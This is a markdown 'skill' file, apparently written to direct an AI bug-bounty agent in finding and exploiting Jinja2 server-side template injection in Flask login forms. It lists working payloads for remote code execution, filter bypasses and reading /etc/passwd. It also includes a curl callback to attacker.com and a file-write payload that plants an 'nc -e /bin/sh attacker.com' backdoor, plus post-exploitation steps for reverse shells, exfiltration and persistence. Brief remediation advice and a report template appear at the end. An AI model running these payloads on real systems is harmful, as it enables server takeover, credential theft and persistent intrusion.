# 🧪 Flask Login Form – Server-Side Template Injection (SSTI) – AI Bug Bounty Skill

## Skill Name
`flask-ssti-login`

## Description
Specialised detection and exploitation of Server-Side Template Injection vulnerabilities within Python Flask login forms. This skill analyses how user-supplied data (username, password, CSRF tokens, error parameters) is processed by the Jinja2 template engine and identifies cases where unsanitised input is rendered, leading to arbitrary code execution on the server. It covers both simple reflection of input in error messages ("User {{ username }} not found") and more subtle injection points such as `next` redirect parameters that are rendered in links.

## Affected Components
- **`render_template_string()`** used with user-controllable data (e.g., `render_template_string(f"<h1>Welcome {username}</h1>")`)
- **Template files** containing `{{ request.args.param }}` or `{{ request.form.param }}` without proper escaping.
- **Login error messages** that echo back the username or email: `"User {0} does not exist".format(username)` passed to `render_template_string` or concatenated into template.
- **Redirect URL rendering**: `next` parameter rendered in a template link `<a href="{{ next }}">Click here</a>` where `next` is user-controlled.
- **Password reset / forgot password** flows where email is reflected.
- **Custom 404/error handlers** that use unsanitised input from the request path or query string on login pages.

## Detection Patterns (Static & Dynamic)
### 1. Jinja2 SSTI via Reflection of `username`
When a login fails with a message like "User **{{ username }}** not found", the application may be rendering `username` unsafely.
```python
# Vulnerable
error = f"User {username} not found"
return render_template_string(f"<p>{error}</p>")
```
- **Heuristic**: Any use of `render_template_string()` with string formatting or concatenation that includes request data.
- **Dynamic test**: Submit `{{7*7}}` as username; if the response contains `49`, SSTI is confirmed.

### 2. Template File with Direct `request` Object Usage
```html
<!-- vulnerable template -->
<p>Hello {{ request.form.username }}</p>
```
- **Heuristic**: The template accesses `request.form` or `request.args` directly inside `{{ }}`. This is inherently dangerous only if auto-escaping is disabled, but testing is still required.
- **Dynamic test**: Enter `{{config}}` in username – if Flask config is dumped, injection works.

### 3. SSTI in `next`/redirect_to Parameters
```html
<a href="{{ next }}">Continue</a>
```
- **Heuristic**: `next` parameter passed to template unvalidated.
- **Dynamic test**: Manipulate `next` parameter to `{{config}}` and see if it's evaluated.

### 4. Template Injection via User-Agent or Other Headers
- **Heuristic**: Server logs or welcome messages that include the User-Agent (rendered in template).
- **Dynamic test**: Set User-Agent to `{{7*7}}` and check login page response.

### 5. Error-Based Detection
- Injecting `{{` with unclosed braces may cause a Jinja2 error revealing the framework.
- Injecting `{{ undefined_variable }}` may throw a `jinja2.exceptions.UndefinedError`.

### 6. Blind SSTI
If output is not directly visible, use out-of-band techniques: `{{ ''.__class__.__mro__[2].__subclasses__()[X] }}` to trigger DNS/HTTP requests via `curl`, `wget`, or `urllib`.

## Testing Methodology (AI Agent Steps)
1. **Identify Input Vectors**
   - Username, password, email, `next` parameter, CSRF token, hidden fields.
   - Any field that, when submitted with an invalid value, reflects that value in the response (error message, page title, etc.).
   - Also inspect the HTML for `{{ request.form.xxx }}` or `{{ request.args.xxx }}`.

2. **Confirm Template Injection (Polyglot Test)**
   - Inject `{{ '7'*7 }}` – if response shows `7777777`, SSTI confirmed.
   - Alternative polyglots: `{{ 7*7 }}` → `49`, `${7*7}` for Freemarker (not Flask), `{{config}}` → Flask config dictionary.
   - If automatic escaping is on (single braces), try `{% debug %}` or `{% print(123) %}`.

3. **Engine Fingerprinting**
   - For Jinja2: `{{ ''.__class__.__mro__ }}` returns `<class 'object'>`; `{{ config }}` dumps app config.
   - Differentiate from Tornado, Mako, Django template. Flask always Jinja2.

4. **Environment Reconnaissance**
   - Dump configuration: `{{ config }}`, `{{ self.__init__.__globals__ }}`.
   - List available classes: `{{ ''.__class__.__mro__[2].__subclasses__() }}`.
   - Find `subprocess.Popen` or `os.system` from the list.

5. **Achieving Code Execution / RCE**
   - Classic payload using `subprocess.Popen`:
     ```python
     {{ ''.__class__.__mro__[2].__subclasses__()[X].__init__.__globals__['sys'].modules['os'].popen('id').read() }}
     ```
     Find index X for `subprocess.Popen` manually (or use the `__subclasses__()` dump).
   - Simpler with `lipsum` or `cycler`:
     ```python
     {{ cycler.__init__.__globals__.os.popen('id').read() }}
     ```
   - Using `__builtins__`:
     ```python
     {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
     ```

6. **Filter & Character Blacklist Bypasses**
   If dots, underscores, or brackets are filtered, use:
   - Attribute access with `|attr()`: `''|attr('__class__')` → `''.__class__`.
   - String concatenation: `{{ ""["__cla"+"ss__"] }}`.
   - Hex/octal representation: `{{ ""["\x5f\x5fclass\x5f\x5f"] }}`.
   - Request object: `{{ request|attr('application')|attr('__globals__') }}`.

7. **Blind SSTI Confirmation (OOB)**
   - If no reflection, force a callback:
     ```python
     {{ ''.__class__.__mro__[2].__subclasses__()[X](['curl','http://attacker.com/?c=$(id)']) }}
     ```
     (Where subclass X allows command execution, e.g., `subprocess.Popen`).

## Essential Payloads (Jinja2/Flask SSTI)

### Detection Payloads
| Payload | Expected Response |
|--------|-------------------|
| `{{7*7}}` | 49 |
| `{{config}}` | Flask app configuration |
| `{{ self.__init__.__globals__ }}` | Python globals of the template object |

### Dump Subclasses to Find RCE Vector
`{{ ''.__class__.__mro__[2].__subclasses__() }}`  
Returns list; locate `<class 'subprocess.Popen'>` index.

### RCE Payload (Standard)
```python
{{ ''.__class__.__mro__[2].__subclasses__()[XX].__init__.__globals__['os'].popen('id').read() }}
```
Replace `XX` with the index of `subprocess.Popen` (or `os._wrap_close` / `warnings.catch_warnings`).

### RCE via `lipsum` (Often works without index hunting)
```python
{{ lipsum.__globals__['os'].popen('id').read() }}
```

### RCE via `cycler`
```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

### RCE via `request.application`
```python
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Bypass Filters (Example: No double underscores)
- Using `attr`: `''|attr("__class__")`
- Using request: `{{ request|attr("application")|attr("__globals__")|attr("__getitem__")("__builtins__")|attr("__getitem__")("__import__")("os")|attr("popen")("id")|attr("read")() }}`

### File Read Payload
```python
{{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}
```

### Write File Payload
```python
{{ self.__init__.__globals__.__builtins__.open('/tmp/backdoor.py','w').write('import os; os.system("nc -e /bin/sh attacker.com 1234")') }}
```

## Post-Exploitation
- **Reverse shell**: Use Python or bash reverse shell payloads within `popen`.
- **Data exfiltration**: Read source code, environment variables, database configs from `config` or `os.environ`.
- **Persistence**: Write a cron job or modify app files.
- **Pivoting**: Access internal networks using the compromised server.

## Secure Coding Recommendations
- **Never use `render_template_string()` with user input**. Always use `render_template()` and pass data as variables, which are auto-escaped.
- **Enable Jinja2 auto-escaping** (default in Flask).
- **Sanitise error messages**: If you must display the user's input, wrap it in `Markup.escape()` or use `|e` filter.
- **Avoid template injection points**: Do not render `{{ request.args.* }}` or `{{ request.form.* }}` directly in templates.
- **Use Content Security Policy (CSP)** to mitigate impact.
- **Run application with minimal privileges** to limit damage if RCE occurs.

## Output Format (Bug Report)
```
Title: Server-Side Template Injection (SSTI) in Login Form
Severity: Critical (CVSS 10.0)
Endpoint: POST /login
Vulnerable Parameter: username
Proof of Concept:
  Request:
    POST /login HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    username={{config}}&password=any
  Response contains Flask secret key and database URI.
Remediation: Replace render_template_string with render_template and pass username as a context variable.
```

## Skill Metadata
- **Author**: AI Bug Bounty Hunter
- **Version**: 1.0
- **Target Framework**: Flask (Python) with Jinja2 template engine
- **Testing Type**: Black-box / Grey-box
- **Dependencies**: None; AI model can generate payloads and interpret server responses.